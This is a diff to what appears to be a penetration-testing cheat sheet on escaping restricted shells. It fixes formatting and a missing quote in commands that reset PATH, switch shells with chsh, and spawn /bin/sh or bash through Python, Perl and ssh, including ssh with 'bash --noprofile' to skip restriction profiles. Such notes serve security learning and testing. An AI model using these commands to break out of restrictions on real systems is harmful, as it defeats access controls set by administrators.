@@ -49,7 +49,7 @@ export PATH=/bin:/usr/bin:/sbin:$PATH
 export SHELL=/bin/sh
 ```
 
- or if chsh command is present just change the shell to /bin/bash
+or if chsh command is present just change the shell to /bin/bash
 
 ```
 chsh
@@ -57,7 +57,7 @@ password: <password will be asked>
 /bin/bash
 ```
 
- If we can copy files into existing PATH, copy
+If we can copy files into existing PATH, copy
 
 ```
 cp /bin/sh /current/directory; sh
@@ -80,15 +80,15 @@ Some commands let us execute other system commands, often bypassing shell restri
 echo "Your evil code" | tee script.sh
 ```
 
- Invoke shell thru scripting language
+Invoke shell thru scripting language
 
- Python
+Python
 
 ```
-python -c 'import os; os.system("/bin/bash")
+python -c 'import os; os.system("/bin/bash")'
 ```
 
- Perl
+Perl
 
 ```
 perl -e 'exec "/bin/sh";'
@@ -102,7 +102,7 @@ perl -e 'exec "/bin/sh";'
 ssh username@IP -t "/bin/sh"
 ```
 
-*  Start the remote shell without loading “rc” profile \( where most of the limitations are often configured\)
+* Start the remote shell without loading “rc” profile \( where most of the limitations are often configured\)
 
 ```
 ssh username@IP -t "bash --noprofile"
